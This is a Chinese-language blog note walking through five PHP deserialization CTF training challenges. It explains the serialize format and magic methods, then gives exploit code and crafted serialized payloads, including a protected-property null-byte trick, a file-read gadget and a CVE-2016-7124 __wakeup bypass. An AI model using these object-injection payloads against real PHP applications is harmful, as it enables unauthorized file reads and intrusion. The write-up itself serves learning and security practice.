---
title: "Note #1: PHP Deserialization "
date: 2019-05-02 00:58:53
tags:
  - Note
  - vulnerability
  - php
categories: Note
---

This is the training about PHP Deserialization which created by somebody whos sitting next to me...

<!--more-->

總共五題，依序從最後一題寫回第一題，不要問我為什麼，不是我不知道，只是我不想說 (￣･ω･￣)

## 前導片

> some example and table just copy from somebody's ppt :-)

### PHP Serialize

PHP 序列化後的模樣

```php
<?php
class sayname{
    public $name = "elmo";
}

echo serialize(new sayname());
// O:7:"sayname":1:{s:4:"name";s:4:"elmo";}
```

輸出之序列化物件其結構為

```
型態為類別 : 類別名稱長度 : 類別名稱 : 類別中的變數個數 :
{ 型態為字串 : 變數名稱長度 : 變數名稱 ; 型態為字串 : 字串內容長度 : 字串內容 }
```

在這之前關於序列化與反序列化除了觀念之外接觸的語言只有 java，相較之下覺得 php 序列化後的物件可讀性很高XD

序列化的型態有以下幾種表示

|Serialize|Format|
|:-:|:-:|
|a|array|
|b|boolean|
|d|double|
|i|integer|
|o|common object|
|s|non-escaped binary string|
|S|escaped binary string|
|C|custom object|
|O|class|
|N|null|
|R|pointer reference|
|U|unicode string|

### Serialize Variable Type

從 PHP 的序列化物件中也可以判別其變數的訪問類型 (public, private, protected)

|Type|Serialize|
|:-|:-|
|class test1{<font color="red">public</font> $t1 = "1";}|O:5:"test1":1:{<font color="red">s:2:"t1";</font>s:1:"1";}|
|class test2{<font color="red">private</font> $t2 = "2";}|O:5:"test2":1:{<font color="red">s:9:"test2t2";</font>s:1:"2";}|
|class test3{<font color="red">protected</font> $t3 = "3";}|O:5:"test3":1:{<font color="red">s:5:"*t3";</font>s:1:"3";}|

private 的變數名稱是 “類別名稱 + 變數名稱”，但長度多了 2，而 protected 的變數名稱前面加了 *，長度也多了 2，原因是空字元 (Null Character)

> addslashes(): 在特殊字元前面加反斜線。
> 特殊字元：單引號、雙引號、反斜線、NULL

use addslashes()

|Type|Serialize|
|:-|:-|
|class test2{<font color="red">private</font> $t2 = "2";}|O:5:"test2":1:{<font color="red">s:9:\"\0test2\0t2\";</font>s:1:"2";}|
|class test3{<font color="red">protected</font> $t3 = "3";}|O:5:"test3":1:{<font color="red">s:5:\"\0*\0t3\";</font>s:1:"3";}|

private 和 protected 多出來的兩個字元，分別是類別名稱前後加了空字元、星號前後也加了空字元

### Magic Methods in PHP class

PHP class 中的 Magic Methods，都是以 __ 作為開頭，如果不特別寫他還是存在，只是不會做事，而每個函式都有他的特性，系統會在特定的時機呼叫它。

簡介這五題會用到的部分

|Function|Description|
|:-|:-|
|__construct|第一個執行|
|__destruct|最後一個執行|
|__call|呼叫了某個沒有在類別中定義的方法時執行|
|__invoke|物件被當作函數來呼叫時執行|
|__toString|把物件當字串操作時執行|
|__wakeup|在反序列化前執行，會返回一個陣列，列舉要被反序列化的屬性名稱|
|__sleep|在序列化前執行，會返回一個陣列，列舉要被序列化的屬性名稱|

## 正片開始

### Deserialization 05

```php
<?php
    show_source(__FILE__);
    include_once('flag.php');

    class Challenge{
        public $mod;

        public function __destruct(){
            $this->mod->test1();
        }
    }

    class Function1{
        public $mod;
        public function test1(){
            $this->mod->test2();
        }
    }

    class Function2{
        public $mod;
        public function __call($test2, $arr){
            $tmp = $this->mod;
            $tmp();
        }
    }

    class Function3{
        public $mod;
        public $mod2;
        public function __invoke(){
            $this->mod2 = "String: ".$this->mod;
        }
    }

    class CustomString{
        public $str;
        public function __toString(){
            $this->str->get_flag();
            return "";
        }
    }

    class Flag{
        public function get_flag(){
            show_source('flag.php');
        }
    }

    $your_flag = unserialize($_GET["input"]);
?>
<hr/>
```

這是一個要了解每個 Magic Methods 被系統呼叫的條件，並利用 __construct 把 class 串接起來的題目 (~~沒有要放 exploit 的意思~~)

除了認識 Magic Methods 外，在這題終於了解 `$this` 的意義，舉例來說

```php
<?php
class Test1{
  public $hello;

  public function __construct(){
    $this -> hello = new Test2();
  }

  public function __destruct(){
    $this -> hello -> saysomething();
  }
}

class Test2{
  public function saysomething(){
    echo "Here is Test2";
  }
}

new Test1();
// Here is Test2
```

`$this -> hello` 就是只 `Test1 的 $hello`，把 "->" 以 “的” 的敘述方式來理解

在 Test1 被呼叫時，先將 Test1 的 $hello 宣告他是一個 Test2 類別，使在 class 結束時執行 `$this -> hello -> saysomething()` 變成 `Test2 -> saysomething()` 的意思，就是執行 Test2 類別的 saysomething 方法，所以 `new Test1()` 會 output “Here is Test2”

### Deserialization 04

```php
<?php
    show_source(__FILE__);

    class NISRA{
        public $target;

        public function __construct(){
            $this->target = new Loser();
        }

        public function __destruct(){
            $this->target->action();
        }
    }

    class Loser{
        public function action(){
            echo "You are a loser. Try harder!";
        }
    }

    class Hacker{
        protected $code = 0;
        public function action(){
            if($this->code == 0xdeadbeef){
                show_source('flag.php');
            }else{
                show_source('fake_flag.php');
            }
        }
    }

    $your_flag = unserialize($_GET["input"]);
?>
<hr/>
```

先建一個 Hacker 類別 (題目是建 Loser)，接著就是要讓 if 判別為 True。exploit:

```php
<?php
class NISRA{
        public $target;

        public function __construct(){
            $this->target = new Hacker();
        }

        public function __destruct(){
            $this->target->action();
        }
    }

    class Hacker{
        protected $code = 0xdeadbeef;
        public function action(){
            if($this->code == 0xdeadbeef){
                show_source('flag.php');
            }else{
                show_source('fake_flag.php');
            }
        }
    }

echo serialize(new NISRA());
```

獲得的序列化物件 `O:5:"NISRA":1:{s:6:"target";O:6:"Hacker":1:{s:7:"*code";i:3735928559;}}` 送回去是錯的，原因是 $code 型態為 protected，序列化後 `*` 的前後都有一個空字元，在 url 中以 %00 表示，修改後 `O:5:"NISRA":1:{s:6:"target";O:6:"Hacker":1:{s:7:"%00*%00code";i:3735928559;}}`，送出即得到 flag

### Deserialization 03

```php
<?php
    show_source(__FILE__);

    class FileExplorer{
        public function __construct($file){
            echo "<hr/>";
            show_source($file);
        }
    }

    class NISRA{
        public $file = "hi.php";
        public function __wakeup(){
            $obj = new FileExplorer($this->file);
        }
    }

    $your_flag = unserialize($_GET["input"]);
?>
```

__wakeup(): 在反序列化前執行

先試著 `echo serialize(new NISRA());`

獲得 `O:5:"NISRA":1:{s:4:"file";s:6:"hi.php";}`

送回題目得到 `flag is in ./5k4g4flag.php`

這時可以直接手動把序列化物件中的 hi.php 改成 5k4g4flag.php，且字串內容長度也要記得改，或是將 exploit 中的 $file 值改為 5k4g4flag.php 再生成一次序列化物件，我是選擇後者，因為懶 :3

最後 exploit 產生之序列化物件 `O:5:"NISRA":1:{s:4:"file";s:13:"5k4g4flag.php";}` 送回去即得 flag

### Deserialization 02

```php
<?php
    include("flag.php");

    class Flag{
        public $key = "deadbeef";

        function __destruct(){
            global $flag;
            echo $flag;
        }

        function __wakeup(){
            if($this->key !== $serect){
                global $flag;
                $flag = "You can not read the flag.";
            }
        }
    }

    show_source(__FILE__);
    $your_flag = unserialize($_GET["input"]);
?>
```

雖然最後執行的 `__destruct()` 會 `echo $flag`，但因為要執行 `unserialize()`，還是會在 `__destruct()` 之後執行 `__wakeup()`，導致 flag 被覆寫掉，而不知道 `$secret` 的值，必須想辦法繞過 `__wakeup()` 讓系統不要執行它

這邊在考 [CVE-2016-7124](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-7124)，這是發生在 php 5.6.25 之前以及 php 7.0.10 之前，因對某些無效物件處理不當造成的漏洞

先產生一個正常的序列化物件

```php
<?php
    class Flag{
        public $key = "deadbeef";
    }

	echo serialize(new Flag());
?>
```

拿正常的序列化物件 `O:4:"Flag":1:{s:3:"key";s:8:"deadbeef";}` 送回去會老實的觸發 `__wakeup()` 導致 flag 被覆寫得到 "You can not read the flag."

而 CVE-2016-7124 簡單來說就是當序列化物件中，物件的數量大於實際數量，就會因為系統處理不當無法解析此序列化物件而不執行 `__wakeup()`

以這題為例子

|Serialize|Bypass?1:0|
|:-|:-|
|O:4:"Flag":1:{s:3:"key";s:8:"deadbeef";}|0|
|O:4:"Flag":<font color="red">2</font>:{s:3:"key";s:8:"deadbeef";}|1|
|O:4:"Flag":<font color="red">0</font>:{s:3:"key";s:8:"deadbeef";}|0|
|O:4:"Flag":1:{s:<font color="red">4</font>:"key";s:8:"deadbeef";}|1|
|O:4:"Flag":1:{s:<font color="red">2</font>:"key";s:8:"deadbeef";}|1|
|O:4:"Flag":1:{s:3:"key";s:<font color="red">7</font>:"deadbeef";}|1|
|O:4:"Flag":1:{s:3:"key";s:<font color="red">9</font>:"deadbeef";}|1|

看到漏洞說明後，用表格中第二列的方式讓物件數量大於實際數量（實際只有一個字串，但我把它改成 2）就過了，接著又做了些測試，像是數量小於實際數量就不會過，但修改字串的長度或變數名稱的長度，無論是大於小於一樣都能在這題拿到 flag

### Deserialization 01

前面都被 BOSS 霸凌完後回到人畜無害的第一題

```php
<?php
    show_source(__FILE__);
    include "flag.php";

    $key = "N15RA";
    $input = $_GET["input"];
    if(unserialize($input) === $key)
        echo $flag;
?>
```

exploit:

```php
<?php
echo serialize('N15RA');
// s:5:"N15RA";
```

完工了~

## 彩蛋

在一個跟 php 不熟（沒寫過也沒什麼在打 CTF）、但對序列化 / 反序列化有基礎理解的情況下，除了獲得很多提示，終於跟 php 混熟了點 (?)，耗了一整個下午，感覺學最多的是程式語言基礎，從物件導向開始（繼承、封裝、多型），到逃避了很久沒弄懂的 `$this` 感覺跟 python 的 `self`、java 的 `.this` 有異曲同工之妙，順便認識了 Magic Methods 等等，會寫在最後表示督促自己要乖乖生出下一篇筆記，也就是這一整下午撇除掉 php 反序列問題而習得的東西，如果這樣的預告最後還是沒生出文章的話...
__~~那我會回來把這段刪掉~~__
